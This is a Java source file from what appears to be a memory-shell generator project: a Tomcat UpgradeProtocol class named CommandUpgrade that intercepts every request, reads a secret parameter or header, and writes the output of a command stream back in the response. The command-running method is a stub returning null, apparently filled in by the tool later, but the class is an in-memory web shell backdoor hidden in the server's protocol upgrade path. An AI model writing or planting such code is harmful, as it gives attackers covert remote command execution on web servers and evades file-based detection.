package com.reajason.javaweb.memshell.shelltool.command;

import org.apache.catalina.connector.Response;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Request;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/12/6
 */
public class CommandUpgrade implements UpgradeProtocol {
    public static String paramName;

    @Override
    public boolean accept(Request req) {
        org.apache.catalina.connector.Request request = ((org.apache.catalina.connector.Request) req.getNote(1));
        Response response = request.getResponse();
        try {
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                outputStream.flush();
                outputStream.close();
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return true;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @Override
    public String getHttpUpgradeName(boolean isSSLEnabled) {
        return "";
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return "";
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
        return null;
    }
}
